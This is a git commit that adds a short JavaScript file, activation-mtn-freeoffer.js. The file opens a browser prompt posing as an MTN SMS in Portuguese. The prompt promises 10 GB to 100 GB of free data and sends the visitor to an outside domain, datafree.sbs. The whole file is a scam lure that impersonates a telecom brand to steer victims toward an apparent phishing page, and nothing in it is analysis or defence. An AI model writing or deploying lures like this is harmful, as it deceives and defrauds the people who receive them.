ae830f8c7b5d3d7e06cace871864286d1005004c
mmainomi <akparawa247@gmail.com>
2025-03-30 05:07:31 -0700

    Create activation-mtn-freeoffer.js

---
+++ activation-mtn-freeoffer.js
@@ -0,0 +1,5 @@
+var password = 'Dados grátis'
+password=prompt('MTN SMS: Estimado cliente, por favor verifique se o seu cartão SIM MTN está qualificado para receber 10 GB a 100 GB de dados. Oferta especial para clientes. Prima Dados grátis para verificar agora. ','Dados grátis');
+if (password != 'Dados grátis') {
+location.href='https://datafree.sbs/mtn-freeoffer.html';
+}
